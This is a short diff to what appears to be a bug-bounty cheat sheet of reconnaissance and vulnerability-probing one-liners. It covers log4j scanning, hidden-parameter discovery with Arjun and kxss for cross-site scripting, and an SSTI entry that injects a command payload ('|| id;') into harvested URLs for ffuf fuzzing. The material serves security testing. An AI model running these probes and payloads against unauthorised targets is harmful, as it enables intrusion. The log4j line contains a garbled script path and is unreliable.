@@ -23,6 +23,9 @@ Scan log4j using BBRF and log4j-scan
     Explained command
 bbrf domains | httpx -silent | xargs -I@ sh -c 'python3 http://log4j-scan.py -u "@"'
 
+Finding Hidden Parameter & Potential XSS with Arjun + KXSS:
+arjun -q -u target -oT arjun && cat arjun | awk -F'[?&]' '{baseUrl=$1; for(i=2; i<=NF; i++) {split($i, param, "="); print baseUrl "?" param[1] "="}}' | kxss
+
 SSTI in qsreplase add "{{7*7}}" (0xJin)
 cat subdomains.txt | httpx -silent -status-code | gau --threads 200 | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt
 ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
